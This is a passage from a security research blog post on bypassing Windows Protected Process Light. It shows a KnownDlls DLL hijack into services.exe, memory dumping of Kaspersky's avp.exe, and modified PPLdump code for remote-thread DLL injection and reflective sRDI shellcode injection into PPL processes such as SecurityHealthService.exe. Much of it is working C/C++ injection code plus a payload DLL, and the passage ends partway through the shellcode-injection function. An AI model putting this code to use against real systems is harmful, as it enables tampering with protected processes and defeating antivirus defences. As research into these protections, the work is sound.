<em>The &ldquo;real&rdquo; GLOBALROOT. <a href=https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland/>Source Image</a></em></p><p>Now that we know how to insert an arbitrary entry into the <code>\KnownDlls</code> directory, we return to our original problem and the constraints of our exploitation. Our goal is to execute arbitrary code inside a PPL (Protected Process Light), ideally one signed with the <code>WinTcb</code> level — the highest protection level supported by Windows. Therefore, we need to find a suitable executable that is launched by Windows under this protection level.</p><p>On Windows, we observe that there are four default processes running with <code>WinTcb</code> protection: <code>wininit.exe</code>, <code>services.exe</code>, <code>smss.exe</code>, and <code>csrss.exe</code>. However, both <code>smss.exe</code> and <code>csrss.exe</code> do not run in Win32 mode, so they can be ruled out. The process <code>wininit.exe</code>, while usable, is risky to tamper with if run under an Administrator account with debugging privileges — it may mark itself as a <em>Critical Process</em>, and terminating such a process would cause a system crash (BSOD). Thus, <code>services.exe</code> remains as the most suitable target for our purposes. One reason is that its <code>main()</code> function is easy to decompile and understand logically:</p><pre tabindex=0><code>int wmain()
{
    HANDLE hEvent;
    hEvent = OpenEvent(SYNCHRONIZE, FALSE,
            L&#34;Global\\SC_AutoStartComplete&#34;);

    if (hEvent) {
        CloseHandle(hEvent);
    } else {
        RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        if (NT_SUCCESS(RtlInitializeCriticalSection(&amp;CriticalSection)))
            SvcctrlMain();
    }

    return 0;
}
</code></pre><p>First, the process tries to open a global Event object named <code>Global\SC_AutoStartComplete</code>. If the Event exists, the process exits immediately. Otherwise, it marks itself as a critical process using <code>RtlSetProcessIsCritical()</code> and proceeds to call <code>SvcctrlMain()</code>, which contains the main logic. This simple synchronization mechanism ensures that <code>services.exe</code> only runs once, which is convenient for our exploitation because we do not want to disrupt the Service Control Manager (which also uses <code>services.exe</code>).</p><p>Finally, we use Process Monitor to observe which DLLs <code>services.exe</code> loads. By applying a few filters in Process Monitor, we identify DLLs that are loaded by <code>services.exe</code>. The result is that <code>services.exe</code> loads three DLLs that are not listed in <code>\KnownDlls</code> (as shown in the figure below). However, this information alone is not enough to determine which DLL to hijack. The selection depends on the operating system version and several other factors.</p><p><img src=/images/d070925/15_procmon-loaded-dlls.png alt=Line>
<em>DLLs loaded by services.exe. <a href=https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland/>Source Image</a></em></p><p>Using the attack technique described above, a publicly available tool — <a href=https://github.com/itm4n/PPLdump>https://github.com/itm4n/PPLdump</a> — has implemented the necessary steps to achieve the exploit. However, starting from Windows 10 version 21H2 (build 10.0.19044.1826, July 2022 update), the exploit used by PPLdump no longer works. A patch in <code>ntdll.dll</code> now prevents Protected Process Light (PPL) processes from loading DLLs from <code>\KnownDlls</code>.</p><p>Therefore, we will apply this attack method on an earlier version of Windows, specifically Windows 10 20H2. The result, as shown below, demonstrates that we were able to successfully load our custom DLL into the <code>services.exe</code> process. At this point, we have the highest level of privileges within a PPL process.</p><p>With this elevated context, we can perform privileged operations, such as calling <code>OpenProcess()</code> on another PPL process — in this case, <code>avp.exe</code>, the PPL process of Kaspersky Internet Security — and dump its memory content (see figure below).</p><p><img src=/images/d070925/dumpsucess.png alt=Line>
<em>Memory content.</em></p><p>However, the main goal of our research is not simply to dump memory from a PPL (Protected Process Light) process, but rather to inject a separate DLL into the target PPL process, similar to the injection technique discussed earlier.</p><p>To achieve this, I manually reviewed the source code of the PPLdump tool mentioned previously, and modified its original <code>DumpProcessMemory</code> function accordingly. The goal of this modification was to enable DLL injection into a PPL process. The updated function is shown below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// Modified DumpProcessMemory Function for DLL Injection
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>BOOL <span style=color:#a6e22e>DumpProcessMemory</span>(DWORD dwProcessId, LPWSTR pwszDllPath)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    LogToConsole(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] Target Process ID: %lu</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dwProcessId);
</span></span><span style=display:flex><span>    LogToConsole(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] DLL Path: %ws</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, pwszDllPath);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    BOOL bReturnValue <span style=color:#f92672>=</span> FALSE;
</span></span><span style=display:flex><span>    HANDLE hProcess <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    HANDLE hRemoteThread <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    LPVOID pRemoteBuffer <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    DWORD dwLastError <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    SIZE_T dllLen <span style=color:#f92672>=</span> (wcslen(pwszDllPath) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>wchar_t</span>);
</span></span><span style=display:flex><span>    LPVOID pLoadLibraryW;
</span></span><span style=display:flex><span>    NTSTATUS status;
</span></span><span style=display:flex><span>    uintptr_t remoteLoadLibrary;
</span></span><span style=display:flex><span>    DWORD dwExitCode <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    pNtCreateThreadEx NtCreateThreadEx <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>        (pNtCreateThreadEx)(GetProcAddress(GetModuleHandleW(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;ntdll.dll&#34;</span>), <span style=color:#e6db74>&#34;NtCreateThreadEx&#34;</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    HMODULE hKernel32 <span style=color:#f92672>=</span> GetModuleHandleW(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;kernel32.dll&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>hKernel32)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        LogLastError(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;GetModuleHandleW&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    remoteLoadLibrary <span style=color:#f92672>=</span> GetRemoteProcAddress(hProcess, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;kernel32.dll&#34;</span>, <span style=color:#e6db74>&#34;LoadLibraryW&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>remoteLoadLibrary) {
</span></span><span style=display:flex><span>        LogToConsole(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[-] Failed to resolve LoadLibraryW in target process.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    pLoadLibraryW <span style=color:#f92672>=</span> (LPVOID)remoteLoadLibrary;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    hProcess <span style=color:#f92672>=</span> OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>hProcess)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        LogLastError(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;OpenProcess&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    pRemoteBuffer <span style=color:#f92672>=</span> VirtualAllocEx(hProcess, NULL, dllLen, MEM_COMMIT <span style=color:#f92672>|</span> MEM_RESERVE, PAGE_READWRITE);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>pRemoteBuffer)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        LogLastError(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;VirtualAllocEx&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>WriteProcessMemory(hProcess, pRemoteBuffer, pwszDllPath, dllLen, NULL))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        LogLastError(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;WriteProcessMemory&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>NtCreateThreadEx)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        LogLastError(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;GetProcAddress(NtCreateThreadEx)&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    status <span style=color:#f92672>=</span> NtCreateThreadEx(
</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;</span>hRemoteThread,
</span></span><span style=display:flex><span>        THREAD_ALL_ACCESS,
</span></span><span style=display:flex><span>        NULL,
</span></span><span style=display:flex><span>        hProcess,
</span></span><span style=display:flex><span>        (LPTHREAD_START_ROUTINE)pLoadLibraryW,
</span></span><span style=display:flex><span>        pRemoteBuffer,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>        NULL
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (status <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span>hRemoteThread)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        LogToConsole(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[!] NtCreateThreadEx failed with NTSTATUS: 0x%08X</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, status);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    WaitForSingleObject(hRemoteThread, INFINITE);
</span></span><span style=display:flex><span>    GetExitCodeThread(hRemoteThread, <span style=color:#f92672>&amp;</span>dwExitCode);
</span></span><span style=display:flex><span>    LogToConsole(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[+] Remote thread exited with code: 0x%08X</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dwExitCode);
</span></span><span style=display:flex><span>    bReturnValue <span style=color:#f92672>=</span> TRUE;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>end:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (hRemoteThread) CloseHandle(hRemoteThread);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (pRemoteBuffer) VirtualFreeEx(hProcess, pRemoteBuffer, <span style=color:#ae81ff>0</span>, MEM_RELEASE);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (hProcess) CloseHandle(hProcess);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bReturnValue;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This modification allows us to inject our custom DLL into a PPL process using traditional remote thread creation techniques, which would otherwise be blocked in normal scenarios.</p><p>As a result of the above process, all API calls such as <code>OpenProcess</code>, <code>CreateRemoteThread</code>, and others reported success. However, the code inside the second DLL was never executed. This failure is due to the security design of Protected Process Light (PPL). Because the call to <code>LoadLibraryW</code> inside the target PPL process triggers a request to the Windows kernel, the Code Integrity Policy is enforced. The kernel recognizes that the target process is protected (PPL) and immediately applies strict digital signature verification. Any DLL file to be mapped into the address space of this process must be signed with a valid certificate issued by Microsoft (or an authorized trusted signer).</p><p>Since the custom DLL does not carry such a trusted signature, the kernel rejects the mapping request. However, for stability reasons, it does not crash the target process. Instead, the kernel silently causes <code>LoadLibraryW</code> to fail and return <code>NULL</code>. The remote thread then exits normally, creating a false sense of success. This can be observed in the figure below, where the message <code>Remote thread exited with code: 0x00</code> is displayed, despite the fact that no code was executed from the injected DLL.</p><p><img src=/images/d070925/failinjectppl.png alt=Line>
<em>Failed to inject DLL.</em></p><p>To address this issue, I explored an alternative to traditional DLL injection known as <strong>Reflective DLL Injection</strong> (RDI). Reflective DLL Injection is a technique that allows an attacker to inject a DLL into the memory of a target process without writing the DLL to disk and without relying on traditional API calls such as <code>LoadLibrary</code> or <code>GetProcAddress</code>. Unlike standard DLL injection, which requires the DLL to be loaded through the Windows loader, reflective DLLs are self-loading via an internal loader function.</p><p>This self-loading is implemented via a special exported function within the DLL, commonly called <code>ReflectiveLoader</code>. Let us analyze the differences between traditional injection and reflective injection in more detail.</p><p>Traditional DLL Injection via <code>LoadLibrary</code> is a basic and longstanding method that relies on Windows APIs to load a DLL from disk into a target process. First, the attacker uses <code>OpenProcess()</code> to obtain a handle with sufficient privileges (e.g., <code>PROCESS_ALL_ACCESS</code>). Then, <code>VirtualAllocEx()</code> is used to allocate memory inside the target process, and <code>WriteProcessMemory()</code> writes the path to the malicious DLL (e.g., <code>"C:\Windows\Temp\malware.dll"</code>) into that memory region. The address of <code>LoadLibraryA</code> or <code>LoadLibraryW</code> is resolved from <code>kernel32.dll</code>, which is typically loaded at the same base address across processes. Finally, <code>CreateRemoteThread()</code> is used to create a thread that calls <code>LoadLibrary</code> with the DLL path as an argument, resulting in the DLL being loaded and its <code>DllMain</code> executed.</p><p>However, this approach fails in the context of PPLs due to strict digital signature enforcement: any DLL to be mapped into a PPL must be signed with a trusted certificate from Microsoft or an authorized partner. Additionally, this method requires the DLL to reside on disk, which may trigger detection or access control issues.</p><p>Reflective DLL Injection (RDI) was developed to overcome the disk dependency of traditional methods. This technique enables a DLL to load itself entirely from memory. The attacker creates a DLL containing a special exported function named <code>ReflectiveLoader</code>. Instead of writing a path, the entire contents of the DLL are read into a local buffer, and then written into the target process using <code>VirtualAllocEx()</code> and <code>WriteProcessMemory()</code>.</p><p>The attacker computes the address of <code>ReflectiveLoader</code> inside the remote memory space using:<br>$$\texttt{ReflectiveLoader_Address} = \texttt{Base_Address} + \texttt{Offset}$$</p><p>Then, <code>CreateRemoteThread()</code> is used to invoke this loader function. The <code>ReflectiveLoader</code> replicates the behavior of the Windows loader: it allocates memory for itself, copies headers and sections, processes the Import Address Table and relocation table, and finally calls <code>DllMain</code>. Crucially, the DLL is never registered with the Windows loader, and therefore does not appear in the module list of the target process.</p><p>Shellcode Reflective DLL Injection (sRDI) improves RDI by transforming the DLL into a position-independent payload that behaves like a shellcode. sRDI works similarly to RDI but introduces a small stub of assembly code inserted at the beginning of the DLL, often overwriting the DOS header. This stub computes the base address of the DLL in memory and jumps directly to the <code>ReflectiveLoader</code> using a precompiled offset.</p><p>This design eliminates the need for the injector to know internal offsets. The loader only needs to:</p><ul><li>Allocate memory using <code>VirtualAllocEx</code>,</li><li>Write the shellcode using <code>WriteProcessMemory</code>, and</li><li>Start execution via <code>CreateRemoteThread</code> at the beginning of the buffer.</li></ul><p>When executed, the stub automatically redirects to <code>ReflectiveLoader</code>, which performs the rest of the loading process. The injector treats this shellcode like any standard position-independent payload. We utilize an existing tool, available at <a href=https://github.com/monoxgas/sRDI/>https://github.com/monoxgas/sRDI/</a>, to convert our DLL into a position-independent shellcode suitable for sRDI injection.</p><p>However, to facilitate debugging and confirm whether our injection method is functioning as intended, we not only rely on outputting messages to Debug View but also write a result file directly to the desktop. The following DLL code was crafted to achieve this behavior:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// Payload DLL for Debugging and Verification
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;pch.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>DWORD WINAPI <span style=color:#a6e22e>PayloadThread</span>(LPVOID lpParam)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>OutputDebugStringA</span>(<span style=color:#e6db74>&#34;TEST DBG&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>szFilePath <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Users</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>GAMING</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Desktop</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>PPL_INJECT_RESULT.txt&#34;</span>;
</span></span><span style=display:flex><span>    HANDLE hFile <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> szBuffer[<span style=color:#ae81ff>256</span>];
</span></span><span style=display:flex><span>    DWORD dwBytesWritten;
</span></span><span style=display:flex><span>    DWORD dwLastError;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    hFile <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFileA</span>(szFilePath, GENERIC_WRITE, <span style=color:#ae81ff>0</span>, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (hFile <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        dwLastError <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>        hFile <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFileA</span>(szFilePath, GENERIC_WRITE, <span style=color:#ae81ff>0</span>, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (hFile <span style=color:#f92672>!=</span> INVALID_HANDLE_VALUE)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>sprintf_s</span>(szBuffer, <span style=color:#66d9ef>sizeof</span>(szBuffer), <span style=color:#e6db74>&#34;CreateFile failed with error code: %lu&#34;</span>, dwLastError);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>WriteFile</span>(hFile, szBuffer, <span style=color:#a6e22e>strlen</span>(szBuffer), <span style=color:#f92672>&amp;</span>dwBytesWritten, NULL);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>CloseHandle</span>(hFile);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>sprintf_s</span>(szBuffer, <span style=color:#66d9ef>sizeof</span>(szBuffer), <span style=color:#e6db74>&#34;Success! The payload DLL was executed correctly.&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>WriteFile</span>(hFile, szBuffer, <span style=color:#a6e22e>strlen</span>(szBuffer), <span style=color:#f92672>&amp;</span>dwBytesWritten, NULL);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>CloseHandle</span>(hFile);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BOOL APIENTRY <span style=color:#a6e22e>DllMain</span>(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    HANDLE hThread <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (ul_reason_for_call)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>Sleep</span>(<span style=color:#ae81ff>10000</span>); <span style=color:#75715e>// Delay to ensure environment stability
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>DisableThreadLibraryCalls</span>(hModule);
</span></span><span style=display:flex><span>        hThread <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateThread</span>(NULL, <span style=color:#ae81ff>0</span>, PayloadThread, NULL, <span style=color:#ae81ff>0</span>, NULL);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (hThread)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>CloseHandle</span>(hThread);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>A deliberate delay (<code>Sleep(10000)</code>) is included to allow the process to stabilize before executing the payload. This can be useful when injecting into sensitive or slow-starting processes like those protected under the PPL (Protected Process Light) model. Next, we use the aforementioned sRDI tool to convert the compiled DLL into a shellcode payload. After the conversion, we perform an initial test of the resulting shellcode to verify its functionality and ensure there are no errors during execution. The outcome of this test is shown in the figure below.</p><p><img src=/images/d070925/convert.png alt=Line>
<em>DLL converted into shellcode.</em></p><p>After preparing all the components, we proceed to launch the attack against the <code>SecurityHealthService.exe</code> process, which is also a PPL (Protected Process Light) process. For this attack, we use the binary file that was previously generated by converting our DLL into shellcode using the sRDI tool. We also modify the <code>DumpProcessMemory</code> function in the <code>PPLdump</code> tool to execute the full shellcode injection chain as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// Modified DumpProcessMemory function for shellcode injection
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>BOOL <span style=color:#a6e22e>DumpProcessMemory</span>(DWORD dwProcessId, LPWSTR pwszShellcodePath)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    BOOL bReturnValue <span style=color:#f92672>=</span> FALSE;
</span></span><span style=display:flex><span>    HANDLE hProcess <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    LPVOID pRemoteBuffer <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    HANDLE hThread <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    DWORD dwThreadExitCode <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    HMODULE hNtdll <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    pfnNtCreateThreadEx NtCreateThreadEx <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    NTSTATUS status <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    HANDLE hFile <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    LPVOID pShellcodeBuffer <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    DWORD dwFileSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    DWORD dwBytesRead <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>LogToConsole</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] Shellcode File Injection (via NtCreateThreadEx) Target PID: %lu</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dwProcessId);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    hNtdll <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetModuleHandleW</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;ntdll.dll&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>hNtdll) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogLastError</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;GetModuleHandleW(ntdll.dll)&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    NtCreateThreadEx <span style=color:#f92672>=</span> (pfnNtCreateThreadEx)<span style=color:#a6e22e>GetProcAddress</span>(hNtdll, <span style=color:#e6db74>&#34;NtCreateThreadEx&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>NtCreateThreadEx) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogLastError</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;GetProcAddress(NtCreateThreadEx)&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>LogToConsole</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] Reading shellcode from file: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, pwszShellcodePath);
</span></span><span style=display:flex><span>    hFile <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFileW</span>(pwszShellcodePath, GENERIC_READ, <span style=color:#ae81ff>0</span>, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (hFile <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogLastError</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;CreateFileW (for shellcode)&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    dwFileSize <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetFileSize</span>(hFile, NULL);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (dwFileSize <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> dwFileSize <span style=color:#f92672>==</span> INVALID_FILE_SIZE) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogToConsole</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[-] Shellcode file is empty or size could not be read.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    pShellcodeBuffer <span style=color:#f92672>=</span> <span style=color:#a6e22e>HeapAlloc</span>(<span style=color:#a6e22e>GetProcessHeap</span>(), <span style=color:#ae81ff>0</span>, dwFileSize);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>pShellcodeBuffer) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogLastError</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;HeapAlloc&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>ReadFile</span>(hFile, pShellcodeBuffer, dwFileSize, <span style=color:#f92672>&amp;</span>dwBytesRead, NULL) <span style=color:#f92672>||</span> dwBytesRead <span style=color:#f92672>!=</span> dwFileSize) {
